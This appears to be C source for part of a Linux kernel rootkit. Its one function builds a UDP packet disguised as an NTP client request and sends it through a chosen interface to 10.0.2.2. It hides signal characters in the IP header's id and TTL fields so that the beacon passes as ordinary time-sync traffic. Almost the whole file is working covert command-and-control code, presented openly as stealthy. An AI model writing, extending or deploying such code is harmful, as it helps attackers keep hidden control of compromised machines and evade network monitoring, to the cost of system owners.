// Sends a stealthy beacon hiding in NTP traffic
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/inet.h>
#include <net/ip.h>
#include <net/udp.h>
#include <linux/inetdevice.h>
#include "rootkit.h"

static char *iface = "ens3";
module_param(iface, charp, 0000);
MODULE_PARM_DESC(iface, "Interface to send packet through");

int send_ntp_beacon(void)
{
    struct net_device *dev;
    struct sk_buff *skb;
    struct udphdr *udph;
    struct iphdr *iph;
    unsigned char *data;
    int datalen = 48; // typical NTP request size
    u32 dst_ip = in_aton("10.0.2.2");
    u16 dst_port = 123;
    u16 src_port = 45678;

    dev = dev_get_by_name(&init_net, iface);
    if (!dev) {
        DBG_PRINT("Interface %s not found\n", iface);
        return -ENODEV;
    }

    skb = alloc_skb(LL_MAX_HEADER + sizeof(struct iphdr) + sizeof(struct udphdr) + datalen, GFP_ATOMIC);
    if (!skb) {
        DBG_PRINT("Failed to allocate skb\n");
        dev_put(dev);
        return -ENOMEM;
    }

    skb_reserve(skb, LL_MAX_HEADER);
    skb_reset_network_header(skb);

    // Add IP header
    iph = (struct iphdr *)skb_put(skb, sizeof(struct iphdr));
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + datalen);
    iph->id = 0x55; // Encoded 'U'
    iph->frag_off = 0;
    iph->ttl = 0x50;       // Encoded 'P'
    iph->protocol = IPPROTO_UDP;
    // iph->saddr = dev->ip_ptr->ifa_list->ifa_address; // use device IP
    // Safely get device IP address
    struct in_device *in_dev = in_dev_get(dev);
    if (in_dev && in_dev->ifa_list) {
        iph->saddr = in_dev->ifa_list->ifa_local; // Correct field for primary IP
        in_dev_put(in_dev);
    } else {
        DBG_PRINT("Failed to get device IP\n");
        kfree_skb(skb);
        dev_put(dev);
        return -EADDRNOTAVAIL;
    }
    iph->daddr = dst_ip;
    iph->check = 0;
    iph->check = ip_fast_csum((unsigned char *)iph, iph->ihl);

    skb_set_transport_header(skb, skb->len);

    // Add UDP header
    udph = (struct udphdr *)skb_put(skb, sizeof(struct udphdr));
    udph->source = htons(src_port);
    udph->dest = htons(dst_port);
    udph->len = htons(sizeof(struct udphdr) + datalen);
    udph->check = 0; // skipping checksum (optional)

    // Add fake NTP payload (looks legit)
    data = skb_put(skb, datalen);
    memset(data, 0, datalen);
    data[0] = 0x1b; // NTP client request (LI = 0, VN = 3, Mode = 3)

    // skb->dev = dev;
    skb->protocol = htons(ETH_P_IP);
    skb->priority = 0;

    struct rtable *rt;
    struct flowi4 fl4 = {
        .daddr = dst_ip,
        .saddr = iph->saddr,
        .flowi4_proto = IPPROTO_UDP,
    };

    rt = ip_route_output_key(&init_net, &fl4);
    if (IS_ERR(rt)) {
        DBG_PRINT("Routing failed\n");
        kfree_skb(skb);
        dev_put(dev);
        return PTR_ERR(rt);
    }

    skb_dst_set(skb, &rt->dst);
    ip_local_out(&init_net, NULL, skb); // now it's safe


    // dev_hard_header(skb, dev, ETH_P_IP, dev->dev_addr, dev->dev_addr, skb->len);
    // ip_local_out(&init_net, NULL, skb); // Send packet!

    dev_put(dev);
    return 0;
}
